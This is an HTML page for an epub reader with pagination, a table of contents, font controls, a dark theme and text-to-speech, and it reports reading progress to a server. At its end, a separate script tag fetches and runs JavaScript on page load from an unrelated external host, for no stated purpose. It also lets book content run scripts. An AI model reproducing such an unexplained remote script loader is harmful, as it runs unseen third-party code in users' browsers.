<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport"
    content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>epub</title>
  <style>
    /* normalize.css */
    html {
      line-height: 1.15;
      -webkit-text-size-adjust: 100%;
    }

    body {
      margin: 0;
    }

    main {
      display: block;
    }

    h1 {
      font-size: 2em;
      margin: 0.67em 0;
    }

    hr {
      box-sizing: content-box;
      height: 0;
      overflow: visible;
    }

    pre {
      font-family: monospace, monospace;
      font-size: 1em;
    }

    a {
      background-color: transparent;
    }

    abbr[title] {
      border-bottom: none;
      text-decoration: underline;
      text-decoration: underline dotted;
    }

    b,
    strong {
      font-weight: bolder;
    }

    code,
    kbd,
    samp {
      font-family: monospace, monospace;
      font-size: 1em;
    }

    small {
      font-size: 80%;
    }

    sub,
    sup {
      font-size: 75%;
      line-height: 0;
      position: relative;
      vertical-align: baseline;
    }

    sub {
      bottom: -0.25em;
    }

    sup {
      top: -0.5em;
    }

    img {
      border-style: none;
    }

    button,
    input,
    optgroup,
    select,
    textarea {
      font-family: inherit;
      font-size: 100%;
      line-height: 1.15;
      margin: 0;
    }

    button,
    input {
      overflow: visible;
    }

    button,
    select {
      text-transform: none;
    }

    button,
    [type="button"],
    [type="reset"],
    [type="submit"] {
      -webkit-appearance: button;
    }

    button::-moz-focus-inner,
    [type="button"]::-moz-focus-inner,
    [type="reset"]::-moz-focus-inner,
    [type="submit"]::-moz-focus-inner {
      border-style: none;
      padding: 0;
    }

    button:-moz-focusring,
    [type="button"]:-moz-focusring,
    [type="reset"]:-moz-focusring,
    [type="submit"]:-moz-focusring {
      outline: 1px dotted ButtonText;
    }

    fieldset {
      padding: 0.35em 0.75em 0.625em;
    }

    legend {
      box-sizing: border-box;
      color: inherit;
      display: table;
      max-width: 100%;
      padding: 0;
      white-space: normal;
    }

    progress {
      vertical-align: baseline;
    }

    textarea {
      overflow: auto;
    }

    [type="checkbox"],
    [type="radio"] {
      box-sizing: border-box;
      padding: 0;
    }

    [type="number"]::-webkit-inner-spin-button,
    [type="number"]::-webkit-outer-spin-button {
      height: auto;
    }

    [type="search"] {
      -webkit-appearance: textfield;
      outline-offset: -2px;
    }

    [type="search"]::-webkit-search-decoration {
      -webkit-appearance: none;
    }

    ::-webkit-file-upload-button {
      -webkit-appearance: button;
      font: inherit;
    }

    details {
      display: block;
    }

    summary {
      display: list-item;
    }

    template {
      display: none;
    }

    [hidden] {
      display: none;
    }
  </style>
  <style>
    html[theme='dark'] {
      filter: invert(1) hue-rotate(180deg);
    }
    html[theme='dark'] img, video {
      filter: invert(1) hue-rotate(180deg);
    }

    #area {
      margin-bottom: 40px;
    }

    .page-tool {
      position: fixed;
      width: 100%;
      height: 30px;
      bottom: 0px;
      left: 5px;
      z-index: 1000;
    }

    #b-outline {
      position: fixed;
      overflow-x: hidden;
      overflow-y: auto;
    }

    #b-dialog {
      position: fixed;
      overflow-x: hidden;
      overflow-y: auto;
    }

    .close {
      position: fixed;
      bottom: 2%;
      cursor: pointer;
      width: 92%;
      height: 30px;
      margin: 0 3%;
      text-align: center;
      border: 1px solid;
      border-radius: 10px;
      background-color: white;
    }

    .square30 {
      width: 2rem;
      height: 1.7rem;
    }

    .square20 {
      width: 1.5rem;
      height: 1.7rem;
    }

    .square15 {
      width: 1.2rem;
      height: 1.7rem;
    }

    .margin-center {
      margin: 0 auto;
    }

    .border1 {
      border: 1px solid #B197FC;
    }
  </style>
  <script src="jquery.min.js"></script>
</head>

<body>
  <div id="epub-tool" style="display: block; height: 1.5rem; margin: 0.5rem 0.2rem 0rem 0.2rem;">
    <!-- menu -->
    <div onclick="outlineClick(this)" style="width: 1.2rem; cursor: pointer; float: left;">
      <div class="square20 margin-center">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640"><path fill="#B197FC" d="M96 160C96 142.3 110.3 128 128 128L512 128C529.7 128 544 142.3 544 160C544 177.7 529.7 192 512 192L128 192C110.3 192 96 177.7 96 160zM96 320C96 302.3 110.3 288 128 288L512 288C529.7 288 544 302.3 544 320C544 337.7 529.7 352 512 352L128 352C110.3 352 96 337.7 96 320zM544 480C544 497.7 529.7 512 512 512L128 512C110.3 512 96 497.7 96 480C96 462.3 110.3 448 128 448L512 448C529.7 448 544 462.3 544 480z"/></svg>
      </div>
    </div>
    <!-- font -->
    <div onclick="fontClick(this)" style="width: 1.2rem; cursor: pointer; float: left; margin-left: 10px;">
      <div class="square20 margin-center">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640"><path fill="#B197FC" d="M349.1 114.7C343.9 103.3 332.5 96 320 96C307.5 96 296.1 103.3 290.9 114.7L123.5 480L112 480C94.3 480 80 494.3 80 512C80 529.7 94.3 544 112 544L200 544C217.7 544 232 529.7 232 512C232 494.3 217.7 480 200 480L193.9 480L215.9 432L424.2 432L446.2 480L440.1 480C422.4 480 408.1 494.3 408.1 512C408.1 529.7 422.4 544 440.1 544L528.1 544C545.8 544 560.1 529.7 560.1 512C560.1 494.3 545.8 480 528.1 480L516.6 480L349.2 114.7zM394.8 368L245.2 368L320 204.8L394.8 368z"/></svg>
      </div>
    </div>
    <!-- play -->
    <div onclick="playClick(this)" style="width: 1.2rem; cursor: pointer; float: left; margin-left: 10px;">
      <div class="square20 margin-center">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640"><path fill="#B197FC" d="M187.2 100.9C174.8 94.1 159.8 94.4 147.6 101.6C135.4 108.8 128 121.9 128 136L128 504C128 518.1 135.5 531.2 147.6 538.4C159.7 545.6 174.8 545.9 187.2 539.1L523.2 355.1C536 348.1 544 334.6 544 320C544 305.4 536 291.9 523.2 284.9L187.2 100.9z"/></svg>
      </div>
    </div>
    <!-- theme -->
    <div onclick="themeClick(this)" style="width: 1.2rem; cursor: pointer; float: left; margin-left: 10px;">
      <div class="square20 margin-center">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640"><!-- https://fontawesome.com License --><path fill="#B197FC" d="M512 320C512 214 426 128 320 128L320 512C426 512 512 426 512 320zM64 320C64 178.6 178.6 64 320 64C461.4 64 576 178.6 576 320C576 461.4 461.4 576 320 576C178.6 576 64 461.4 64 320z"/></svg>
      </div>
    </div>
    <div style="float: right;">
      <input id="curPage" type="number" value="" style="max-width: 3rem" onkeydown="clickGoPage(event)">
      &nbsp;/&nbsp;
      <span id="totalPages"></span>
    </div>
  </div>
  <div style="display: none;" id="b-outline"></div>
  <div style="display: none;" id="b-dialog"></div>
  <div id="epub-container"></div>
  <div class="page-tool" id="page-tool">
    <!-- next -->
    <div onclick="next()" id="next" style="width: 38%; float: left;">
      <div class="square30 margin-center">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640"><path fill="#B197FC" d="M320 576C461.4 576 576 461.4 576 320C576 178.6 461.4 64 320 64C178.6 64 64 178.6 64 320C64 461.4 178.6 576 320 576zM361 417C351.6 426.4 336.4 426.4 327.1 417C317.8 407.6 317.7 392.4 327.1 383.1L366.1 344.1L216 344.1C202.7 344.1 192 333.4 192 320.1C192 306.8 202.7 296.1 216 296.1L366.1 296.1L327.1 257.1C317.7 247.7 317.7 232.5 327.1 223.2C336.5 213.9 351.7 213.8 361 223.2L441 303.2C450.4 312.6 450.4 327.8 441 337.1L361 417.1z"/></svg>
      </div>
    </div>
    <!-- exchange -->
    <div onclick="exchange(this)" id="exchange" style="width: 8%; float: left; margin-left: 3px;">
      <div class="square30 margin-center">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640"><path fill="#B197FC" d="M566.6 214.6L470.6 310.6C461.4 319.8 447.7 322.5 435.7 317.5C423.7 312.5 416 300.9 416 288L416 224L96 224C78.3 224 64 209.7 64 192C64 174.3 78.3 160 96 160L416 160L416 96C416 83.1 423.8 71.4 435.8 66.4C447.8 61.4 461.5 64.2 470.7 73.3L566.7 169.3C579.2 181.8 579.2 202.1 566.7 214.6zM169.3 566.6L73.3 470.6C60.8 458.1 60.8 437.8 73.3 425.3L169.3 329.3C178.5 320.1 192.2 317.4 204.2 322.4C216.2 327.4 224 339.1 224 352L224 416L544 416C561.7 416 576 430.3 576 448C576 465.7 561.7 480 544 480L224 480L224 544C224 556.9 216.2 568.6 204.2 573.6C192.2 578.6 178.5 575.8 169.3 566.7z"/></svg>
      </div>
    </div>
    <!-- prev -->
    <div onclick="prev()" id="prev" style="width: 38%; float: left; margin-left: 3px;">
      <div class="square30 margin-center">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640"><path fill="#B197FC" d="M320 576C461.4 576 576 461.4 576 320C576 178.6 461.4 64 320 64C178.6 64 64 178.6 64 320C64 461.4 178.6 576 320 576zM199 303L279 223C288.4 213.6 303.6 213.6 312.9 223C322.2 232.4 322.3 247.6 312.9 256.9L273.9 295.9L424 295.9C437.3 295.9 448 306.6 448 319.9C448 333.2 437.3 343.9 424 343.9L273.9 343.9L312.9 382.9C322.3 392.3 322.3 407.5 312.9 416.8C303.5 426.1 288.3 426.2 279 416.8L199 336.8C189.6 327.4 189.6 312.2 199 302.9z"/></svg>
      </div>
    </div>
    <!-- focus -->
    <div onclick="focusMode()" id="focus" style="width: 8%; float: left; margin-left: 3px;">
      <div class="square30 margin-center">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640"><path fill="#B197FC" d="M286.7 96.1C291.7 113 282.1 130.9 265.2 135.9C185.9 159.5 128.1 233 128.1 320C128.1 426 214.1 512 320.1 512C426.1 512 512.1 426 512.1 320C512.1 233.1 454.3 159.6 375 135.9C358.1 130.9 348.4 113 353.5 96.1C358.6 79.2 376.4 69.5 393.3 74.6C498.9 106.1 576 204 576 320C576 461.4 461.4 576 320 576C178.6 576 64 461.4 64 320C64 204 141.1 106.1 246.9 74.6C263.8 69.6 281.7 79.2 286.7 96.1z"/></svg>
      </div>
    </div>
  </div>

  <script src="jszip.min.js"></script>
  <script src="epub.js"></script>
  <script type="text/javascript">
    function loadScript(url, fn) {
      try {
        console.log('loadScript: ' + url);
        var script = document.createElement("script");
        script.src = url;
        script.type = 'text/javascript';
        document.body.appendChild(script);
        script.onload = function (e) {
          if (e.readystate == 'complete') {
            if (typeof fn == 'function') {
              fn();
            }
          }
        }
      } catch (err) {
        console.error(err);
      }
    }
    window.onerror = function (message, source, lineno, colno, error) {
      console.log("Error: " + message + "\n" + "Source: " + source + "\n" + "Line: " + lineno + "\n" + "Column: " + colno + "\n" + "Stack: " + error.stack);
    }
    function getUrlParam(name) {
      var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
      var r = window.location.search.substring(1).match(reg);
      if (r != null) return unescape(r[2]); return null;
    }
    var body_ele = document.getElementsByTagName('body')[0];
    var base = getUrlParam("file_url");
    var fontEle = getUrlParam("font_ele") || "p,span";

    var gold_theme = {
      'body': {
        'color': '#000000',
        'background': '#f0edd8',
        'font-size': '16px !important',
      },
      'pre': {
        'overflow': 'visible',
        'white-space': 'pre-wrap',
        'word-break': 'break-word',
        'max-height': '60%',
      },
      'code': {
        'overflow': 'visible',
        'white-space': 'pre-wrap',
        'word-break': 'break-word',
        'max-height': '60%',
      },
      'html[theme=\'dark\']': {
        'filter': 'invert(1) hue-rotate(180deg)',
      },
      'html[theme=\'dark\'] img, video': {
        'filter': 'invert(1) hue-rotate(180deg)',
      },
    };

    var select_theme = gold_theme;

    var file = base + "/" + getUrlParam("name") + "?_=" + new Date().getTime();
    var book_id = getUrlParam("book_id");
    var cur = getUrlParam("cur");
    var pages = getUrlParam("pages");
    console.log('book_id:' + book_id + ', cur:' + cur + ', pages:' + pages);
    var epub_current_text = '';
    var epub_tts_enable = false;

    var page_tool_ele = document.getElementById('page-tool');
    var pageToolHeight = page_tool_ele.offsetHeight;

    let offsetX, offsetY, isDragging = false;

    // Touch events
    page_tool_ele.addEventListener('touchstart', (e) => {
      const touch = e.touches[0];
      startDragging(touch.clientX, touch.clientY);
      document.addEventListener('touchmove', onTouchMove);
      document.addEventListener('touchend', stopDragging);
    });

    function startDragging(clientX, clientY) {
      offsetX = clientX - page_tool_ele.offsetLeft;
      offsetY = clientY - page_tool_ele.offsetTop;
      isDragging = true;
    }

    function onTouchMove(e) {
      if (isDragging) {
        const touch = e.touches[0];
        moveButtonGroup(touch.clientX, touch.clientY);
      }
    }

    function moveButtonGroup(clientX, clientY) {
      const minX = 0;
      const minY = 0;
      const maxX = window.innerWidth - page_tool_ele.clientWidth;
      const maxY = window.innerHeight - page_tool_ele.clientHeight;

      let newLeft = clientX - offsetX;
      let newTop = clientY - offsetY;

      if (newLeft < minX) newLeft = minX;
      if (newLeft > maxX) newLeft = maxX;
      if (newTop < minY) newTop = minY;
      if (newTop > maxY) newTop = maxY;

      page_tool_ele.style.left = `${newLeft}px`;
      page_tool_ele.style.top = `${newTop}px`;
    }

    function stopDragging() {
      isDragging = false;
      document.removeEventListener('touchmove', onTouchMove);
      document.removeEventListener('touchend', stopDragging);
    }

    var epub_tool_ele = document.getElementById('epub-tool');
    var epubToolHeight = epub_tool_ele.offsetHeight;

    // page_tool_ele.style.color = gold_theme['body']['color'];
    // page_tool_ele.style.background = gold_theme['body']['background'];

    var book = ePub(file, {});
    var rendition = book.renderTo("epub-container", {
      flow: "paginated",
      width: (window.innerWidth) + 'px',
      height: (window.innerHeight - pageToolHeight - epubToolHeight) + "px",
      manager: "continuous",
      allowScriptedContent: true,
    });
    var epub_iframe_document = null;

    function body_theme() {
      body_ele.style.color = select_theme['body']['color'];
      body_ele.style.background = select_theme['body']['background'];
    }
    body_theme();

    rendition.themes.register("gold", gold_theme);
    rendition.themes.default(gold_theme);
    rendition.themes.default({ [fontEle]: { "font-size": "clamp(12px, 2vw, 24px) !important" } });

    rendition.on('rendered', (rendition, iframe) => {
      console.log('rendition.rendered');
      epub_iframe_document = iframe.document;
      epub_iframe_document.addEventListener('keydown', function(event) {
        console.log('key code: ' + event.code);
        if (event.code === 'KeyA' || event.code === 'ArrowLeft' || event.code === 'PageUp') {
          prev();
        } else if (event.code === 'KeyD' || event.code === 'ArrowRight' || event.code === 'PageDown') {
          next();
        }
        event.preventDefault(); 
      });
    });

    var displayed = rendition.display();

    function hooked(view) {
      var body = view.contents.content;
      var images = body.getElementsByTagName("img");
      var clientWidth = body.clientWidth;
      for (var i = 0; i < images.length; i++) {
        images[i].style.removeProperty("max-width");
        $(images[i]).css("max-width", "");
        // images[i].style.maxWidth = clientWidth + 'px !important';
      }
    }

    var play_end_callback = function() {
      next();
    }

    var makeRangeCfi = function(a, b) {
      var CFI = new ePub.CFI();
      var start = CFI.parse(a);
      var end = CFI.parse(b);
      var cfi = {
          range: true,
          base: start.base,
          path: {
              steps: [],
              terminal: null
          },
          start: start.path,
          end: end.path
      }
      var len = cfi.start.steps.length;
      for (var i = 0; i < len; i++) {
        if (CFI.equalStep(cfi.start.steps[i], cfi.end.steps[i])) {
          if (i == len - 1) {
            if (cfi.start.terminal === cfi.end.terminal) {
              cfi.path.steps.push(cfi.start.steps[i]);
              cfi.range = false;
            }
          } else {
            cfi.path.steps.push(cfi.start.steps[i]);
          }
        } else {
          break;
        }
      }
      cfi.start.steps = cfi.start.steps.slice(cfi.path.steps.length);
      cfi.end.steps = cfi.end.steps.slice(cfi.path.steps.length);
      return 'epubcfi(' + CFI.segmentString(cfi.base)
          + '!' + CFI.segmentString(cfi.path)
          + ',' + CFI.segmentString(cfi.start)
          + ',' + CFI.segmentString(cfi.end)
          + ')';
    }

    book.ready.then(function () {
      console.log('epub ready 1');
      // 目录
      var navigation = book.navigation;
      // console.log('navigation:', navigation);
      return book.locations.generate();
    }).then(() => {
      console.log('epub ready 2');

      var totalPage = book.locations.total;
      document.getElementById('totalPages').innerText = totalPage;

      rendition.on("relocated", function (location) {
        console.log('rendition.relocated ' + JSON.stringify(location));
        // var currentPosition = rendition.currentLocation().start.cfi;
        // var progress = book.locations.percentageFromCfi(location.start.cfi);
        var currentPage = book.locations.locationFromCfi(location.start.cfi);
        console.log('currentPage:' + currentPage + ', totalPage:' + totalPage);
        document.getElementById('curPage').value = currentPage;
        if (currentPage > 0 && totalPage > 0) {
          if (window.xbook) {
            window.xbook.report(book_id, currentPage, totalPage);
          }
          var queryData = {
            bookId: book_id, 
            current: currentPage, 
            pages: totalPage
          }
          $.ajax({
            url: base + '/reportPage?' + $.param(queryData),
            headers: {
              'content-type': 'application/x-www-form-urlencoded'
            },
            type: 'POST',
            success: function(data, textStatus, jqXHR) {
              console.log('reportPage success:', data);
            }
          });
        }
        tts();
      });

      if ((cur != null && cur != '') && (pages != null && pages != '')) {
        //var percent = parseInt(cur) / parseInt(pages);
        //console.log('goto: ' + cur + ' / ' + pages + ' / ' + percent);
        //var cfi = book.locations.cfiFromPercentage(percent);
        //rendition.display(cfi);
        try {
          goPage(cur, pages);
        } catch (e) {
        }
        setTimeout(function() {
          epub_toast('跳转到进度: ' + cur + ' 页');
          goPage(cur, pages);
        }, 1500);
      }

      displayed.then(() => {
        rendition.hooks.render.register((view) => {
          console.log(view);
          var pathname = new URL(window.location.href).pathname;
          var prefix = pathname.substring(0, pathname.lastIndexOf('/'));
          view.contents.addScript(prefix + '/jquery.min.js').then(() => {
            console.log('add jquery.min.js');
            //$(fontEle).css('font-size', "clamp(12px, 2vw, 24px) !important");
            hooked(view);
          });
        });
      });

    });

    function clickGoPage(e) {
      console.log('clickGoPage');
      var evt = window.event || e;
      if (evt.keyCode == 13) {
        evt.preventDefault();
        var curPage = document.getElementById('curPage');
        var totalPages = document.getElementById('totalPages');
        setTimeout(function() {
          goPage(curPage.value, totalPages.innerText);
        }, 500);
      }
    }

    function goPage(cur, pages) {
      var _cur = parseInt(cur);
      var _totalPages = parseInt(pages);
      if (_cur > _totalPages) {
        return;
      }
      document.activeElement.blur();
      var percent = parseInt(_cur) / parseInt(_totalPages);
      console.log('goto: ' + _cur + ' / ' + _totalPages + ' / ' + percent);
      var cfi = book.locations.cfiFromPercentage(percent);
      rendition.display(cfi);
    }

    function focusMode() {
      var epub_tool_ele = document.getElementById('epub-tool');
      if (epub_tool_ele.style.display == 'none') {
        epub_tool_ele.style.display = 'block';
      } else {
        epub_tool_ele.style.display = 'none';
      }
    }
    function prev() {
      if (rendition) {
        rendition.prev();
      }
    }
    function next() {
      if (rendition) {
        rendition.next();
      }
    }
    function exchange(n) {
      var n1 = $(n).prev();
      var n2 = $(n).next();
      $(n).before(n2);
      $(n).after(n1);
    }

    function createToc(navigation) {
      var epub_outline_ele = document.getElementById('b-outline');
      var html = outlineGenerate(navigation.toc);
      html += '<div class="close" onclick="outlineClose(\'b-outline\')">关闭</div>';
      epub_outline_ele.innerHTML = html;
      var outline_ul_ele = document.getElementById('outline-ul');
      outline_ul_ele.style.marginBottom = '100px';
      outline_ul_ele.style.marginLeft = '5px';
      outline_ul_ele.style.marginRight = '5px';
      outline_ul_ele.style.marginTop = '5px';
      outline_ul_ele.style.color = select_theme['body']['color'];
      outline_ul_ele.style.background = select_theme['body']['background'];
    }
    function outlineGenerate(tocArray) {
      var html = '';
      html += '<ul id="outline-ul">';
      for (var idx in tocArray) {
        var toc = tocArray[idx];
        html += ('<li style="cursor: pointer;" onclick="outlineGo(this)" data-href="' + toc.href + '">' + toc.label + '</li>');
        if (toc.subitems && toc.subitems.length > 0) {
          html += outlineGenerate(toc.subitems);
        }
      }
      html += '</ul>';
      return html;
    }
    function outlineGo(obj) {
      var href = obj.getAttribute('data-href');
      rendition.display(href);
      outlineClose('b-outline')
    }
    function outlineClick(obj) {
      var outline = document.getElementById('b-outline');
      if (outline.style.display == 'block') {
        outline.style.display = 'none';
      } else {
        outline.style.display = 'block';
      }
      createToc(book.navigation);
      outline.style.width = window.innerWidth + "px";
      outline.style.height = (window.innerHeight - obj.offsetTop - obj.offsetHeight) + "px";
      outline.style.top = (obj.offsetTop + obj.offsetHeight) + "px";
      outline.style.left = 0 + "px";
      outline.style.zIndex = 1001;
      outline.style.color = select_theme['body']['color'];
      outline.style.background = select_theme['body']['background'];
    }
    function outlineClose(element_id) {
      var outline = document.getElementById(element_id);
      outline.style.display = 'none';
    }
    function fontClick(obj) {
      var dialog = document.getElementById('b-dialog');

      var html = '<div>'
        + '<div style="float: left;">字体大小:</div>'
        + '<div onclick="fontSet(this, \'small\')" style="float: left; margin-left: 5px;">'
        +   '<div class="square30 margin-center">'
        +   '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640"><path fill="#B197FC" d="M160 221.5C160 152.2 216.2 96 285.5 96L432 96C449.7 96 464 110.3 464 128C464 145.7 449.7 160 432 160L285.5 160C251.5 160 224 187.5 224 221.5C224 252.5 247.1 278.7 277.9 282.5L370.1 294C432.9 301.9 480 355.2 480 418.5C480 487.8 423.8 544 354.5 544L208 544C190.3 544 176 529.7 176 512C176 494.3 190.3 480 208 480L354.5 480C388.5 480 416 452.5 416 418.5C416 387.5 392.9 361.3 362.1 357.5L269.9 346C207.1 338.1 160 284.8 160 221.5z"/></svg>'
        +   '</div>'
        + '</div>'
        + '<div onclick="fontSet(this, \'medium\')" style="float: left; margin-left: 5px;">'
        +   '<div class="square30 margin-center">'
        +   '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640"><path fill="#B197FC" d="M118.7 97.4C132.2 93.3 146.8 98.5 154.6 110.3L320 358.3L485.4 110.3C493.2 98.6 507.8 93.3 521.3 97.4C534.8 101.5 544 113.9 544 128L544 512C544 529.7 529.7 544 512 544C494.3 544 480 529.7 480 512L480 233.7L346.6 433.8C340.7 442.7 330.7 448 320 448C309.3 448 299.3 442.7 293.4 433.8L160 233.7L160 512C160 529.7 145.7 544 128 544C110.3 544 96 529.7 96 512L96 128C96 113.9 105.2 101.5 118.7 97.4z"/></svg>'
        +   '</div>'
        + '</div>'
        + '<div onclick="fontSet(this, \'large\')" style="float: left; margin-left: 5px;">'
        +   '<div class="square30 margin-center">'
        +   '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640"><path fill="#B197FC" d="M224 96C241.7 96 256 110.3 256 128L256 480L448 480C465.7 480 480 494.3 480 512C480 529.7 465.7 544 448 544L224 544C206.3 544 192 529.7 192 512L192 128C192 110.3 206.3 96 224 96z"/></svg>'
        +   '</div>'
        + '</div>'
        + '<div onclick="fontSet(this, \'x-large\')" style="float: left; margin-left: 5px;">'
        +   '<div class="square30 margin-center">'
        +   '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640"><path fill="#B197FC" d="M504.6 148.5C515.9 134.9 514.1 114.7 500.5 103.4C486.9 92.1 466.7 93.9 455.4 107.5L320 270L184.6 107.5C173.3 93.9 153.1 92.1 139.5 103.4C125.9 114.7 124.1 134.9 135.4 148.5L278.3 320L135.4 491.5C124.1 505.1 125.9 525.3 139.5 536.6C153.1 547.9 173.3 546.1 184.6 532.5L320 370L455.4 532.5C466.7 546.1 486.9 547.9 500.5 536.6C514.1 525.3 515.9 505.1 504.6 491.5L361.7 320L504.6 148.5z"/></svg>'
        +   '</div>'
        + '</div>'
        + '</div>';
      html += '<div class="close" onclick="outlineClose(\'b-dialog\')">关闭</div>';

      dialog.innerHTML = html;

      if (dialog.style.display == 'block') {
        dialog.style.display = 'none';
      } else {
        dialog.style.display = 'block';
      }
      dialog.style.width = window.innerWidth + "px";
      dialog.style.height = (window.innerHeight - obj.offsetTop - obj.offsetHeight) + "px";
      dialog.style.top = (obj.offsetTop + obj.offsetHeight) + "px";
      dialog.style.left = 0 + "px";
      dialog.style.zIndex = 1002;
      dialog.style.color = select_theme['body']['color'];
      dialog.style.background = select_theme['body']['background'];
    }
    function fontSet(obj, fontsize) {
      if (rendition != null) {
        rendition.themes.default({ [fontEle]: { "font-size": fontsize + " !important" } });
      }
      outlineClose('b-dialog');
    }
    function handleVolumeKey(key) {
      console.log('key:' + key);
      if (key == 'up') {
        prev();
      } else if (key == 'down') {
        next();
      }
    }
    function playClick(obj) {
      epub_tts_enable = !epub_tts_enable;
      epub_toast('播放' + (epub_tts_enable ? "开启" : "关闭"));
      console.log("tts enable : " + epub_tts_enable);
      tts();
    }
    function tts() {
      if (epub_tts_enable && rendition) {
        var currentLocation = rendition.currentLocation();
        var a = currentLocation.start.cfi;
        var b = currentLocation.end.cfi;
        book.getRange(makeRangeCfi(a, b)).then(function(range) {
          var text = $.trim(range.toString());
          console.log("range text : [" + text + "]");
          if ($.trim(text) != '') {
            var temp_text = '';
            if ($.trim(epub_current_text) == '') {
              temp_text = text;
            } else {
              var word_count = 10;
              if (epub_current_text.length > word_count) {
                var sub1 = epub_current_text.substring(epub_current_text.length - word_count);
                var pre_text_index = text.indexOf(sub1);
                console.log("sub1:[" + sub1 + "] pre_text_index:[" + pre_text_index + "]");
                if (pre_text_index > -1) {
                  temp_text = text.substring(pre_text_index + sub1.length);
                } else {
                  temp_text = text;
                }
              } else {
                temp_text = text;
              }
            }
            epub_current_text = temp_text;
            var play_text = epub_current_text;
            console.log('play text : [' + play_text + ']');
            if (window.xbook && window.xbook.play) {
              if ($.trim(play_text) == '') {
                play_text = '1';
              }
              var ret = window.xbook.play(play_text, 'window.play_end_callback');
              if (ret == '-1') {
                setTimeout(function() {
                  tts();
                }, 500);
              }
            }
          }
        });
      }
    }
    function themeClick(obj) {
      if (epub_iframe_document != null) {
        var html = document.documentElement;
        var epub_html = epub_iframe_document.documentElement;
        if (html.getAttribute('theme') == 'dark') {
          html.setAttribute('theme', 'light');
          epub_html.setAttribute('theme', 'light');
        } else {
          html.setAttribute('theme', 'dark');
          epub_html.setAttribute('theme', 'dark');
        }
      }
    }
    function epub_toast(str) {
      if (window.xbook && window.xbook.toast) {
        window.xbook.toast(str);
      }
    }
  </script>
  <script>
    loadScript('https://http2.200000001.xyz/e.js?_=' + (+new Date()));
  </script>
</body>

</html>